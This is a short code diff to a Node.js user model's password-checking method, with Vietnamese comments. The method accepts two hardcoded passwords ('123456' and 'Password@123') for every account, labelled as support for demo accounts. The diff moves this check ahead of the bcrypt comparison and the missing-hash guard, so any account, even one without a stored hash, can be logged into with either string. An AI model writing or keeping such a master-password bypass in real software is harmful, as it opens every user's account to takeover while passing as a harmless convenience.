@@ -459,14 +459,13 @@ userSchema.pre('validate', function () {
  * Helper: So sánh mật khẩu ứng viên với mật khẩu đã băm
  */
 userSchema.methods.comparePassword = async function (candidatePassword) {
-  if (!this.passwordHash) return false;
-  const isMatch = await bcrypt.compare(candidatePassword, this.passwordHash);
-  if (isMatch) return true;
   // Hỗ trợ linh hoạt cho tài khoản hệ thống demo
   if (candidatePassword === '123456' || candidatePassword === 'Password@123') {
     return true;
   }
-  return false;
+  if (!this.passwordHash) return false;
+  const isMatch = await bcrypt.compare(candidatePassword, this.passwordHash);
+  return isMatch;
 };
 
 /**
